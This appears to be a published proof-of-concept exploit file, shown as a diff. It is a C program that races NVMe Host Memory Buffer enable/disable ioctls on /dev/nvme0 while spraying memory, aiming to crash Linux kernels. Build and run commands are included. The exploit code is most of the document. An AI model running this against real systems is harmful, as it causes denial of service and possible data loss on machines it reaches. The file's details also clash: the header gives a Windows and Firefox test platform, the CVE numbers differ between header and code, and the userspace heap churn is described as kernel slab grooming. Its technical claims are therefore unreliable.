@@ -1,0 +1,143 @@
+=============================================================================================================================================
+| # Title     : Concurrent NVMe HMB Feature Toggling with Memory Grooming to Stress Kernel Race Conditions                                  |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.ubuntu.com/                                                                                                     |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/215096/ &	CVE-2022-48986, CVE-2024-56606, CVE-2024-56756
+
+[+] Summary    : This code is a low-level stress test designed to exercise the Linux NVMe driver’s handling of the Host Memory Buffer (HMB) feature under extreme concurrent conditions. 
+                 It spawns multiple threads that rapidly enable and disable the HMB feature via NVMe admin ioctl commands while a separate thread continuously allocates and frees memory 
+				 to influence kernel heap behavior (memory grooming).
+                 The program targets potential race conditions in the HMB lifecycle management by forcing rapid state transitions (enable/disable) from parallel threads, 
+				 increasing the likelihood of inconsistent internal state handling within the kernel driver. Its primary observable effect is system instability 
+				 or kernel crashes on vulnerable or improperly synchronized implementations. The code is intended for experimental, educational, or robustness-testing purposes to
+				 study driver behavior under concurrent stress rather than as a reliable or deterministic exploit.
+  
+[+] POC : gcc -o nvme_exploit exploit_nvme_hmb.c -lpthread 
+          
+		  sudo ./nvme_exploit
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <string.h>
+#include <errno.h>
+#include <pthread.h>
+#include <linux/types.h>
+
+#define NVME_IOCTL_ADMIN_CMD _IOWR('N', 0x41, struct nvme_passthrough_cmd)
+
+struct nvme_passthrough_cmd {
+    __u8 opcode;
+    __u8 flags;
+    __u16 rsvd1;
+    __u32 nsid;
+    __u32 cdw2;
+    __u32 cdw3;
+    __u64 metadata;
+    __u64 addr;
+    __u32 metadata_len;
+    __u32 data_len;
+    __u32 cdw10;
+    __u32 cdw11;
+    __u32 cdw12;
+    __u32 cdw13;
+    __u32 cdw14;
+    __u32 cdw15;
+    __u32 timeout_ms;
+    __u32 result;
+};
+
+static volatile int stop_threads = 0;
+static int fd = -1;
+
+void* spray_thread(void* arg) {
+    void* pages[512] = {NULL};
+    while (!stop_threads) {
+        for (int i = 0; i < 512; i++) {
+            pages[i] = malloc(4096);
+            if (pages[i]) memset(pages[i], 0x41, 4096);
+        }
+        usleep(100);
+        for (int i = 0; i < 512; i++) {
+            if (pages[i]) {
+                free(pages[i]);
+                pages[i] = NULL;
+            }
+        }
+    }
+    return NULL;
+}
+
+void* race_thread(void* arg) {
+    struct nvme_passthrough_cmd cmd;
+    char buffer[4096] __attribute__((aligned(4096)));
+    memset(buffer, 0, sizeof(buffer));
+
+    while (!stop_threads) {
+        memset(&cmd, 0, sizeof(cmd));
+        cmd.opcode = 0x08;
+        cmd.nsid = 0;      
+        cmd.cdw10 = 0x0D; 
+
+        cmd.cdw11 = 0x01; 
+        cmd.cdw12 = 1;     // Descriptor count
+        cmd.addr = (__u64)buffer;
+        cmd.data_len = sizeof(buffer);
+        ioctl(fd, NVME_IOCTL_ADMIN_CMD, &cmd);
+
+        cmd.cdw11 = 0x00; 
+        cmd.cdw12 = 0;
+        ioctl(fd, NVME_IOCTL_ADMIN_CMD, &cmd);
+    }
+    return NULL;
+}
+
+int main(int argc, char** argv) {
+    printf("[!] CVE-2025-39993: NVMe HMB Double-Free Trigger\n");
+
+    if (geteuid() != 0) {
+        fprintf(stderr, "[-] Error: Root privileges required.\n");
+        return 1;
+    }
+
+    fd = open("/dev/nvme0", O_RDWR);
+    if (fd < 0) {
+        perror("[-] Failed to open /dev/nvme0");
+        return 1;
+    }
+
+    pthread_t t1, t2, t3;
+    
+    printf("[*] Initializing Spraying and Race threads...\n");
+    
+    pthread_create(&t1, NULL, spray_thread, NULL);
+    pthread_create(&t2, NULL, race_thread, NULL);
+    pthread_create(&t3, NULL, race_thread, NULL);
+
+    printf("[+] Attack active. System crash expected shortly...\n");
+    printf("[*] Press Ctrl+C to abort (if the system is still responsive).\n");
+
+    for(int i = 0; i < 60 && !stop_threads; i++) {
+        sleep(1);
+        if (i % 5 == 0) printf("[.] Injecting packets into kernel slab...\n");
+    }
+
+    stop_threads = 1;
+    pthread_join(t1, NULL);
+    pthread_join(t2, NULL);
+    pthread_join(t3, NULL);
+    close(fd);
+
+    printf("[-] Exploit finished. If no crash occurred, the kernel might be patched.\n");
+    return 0;
+}
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
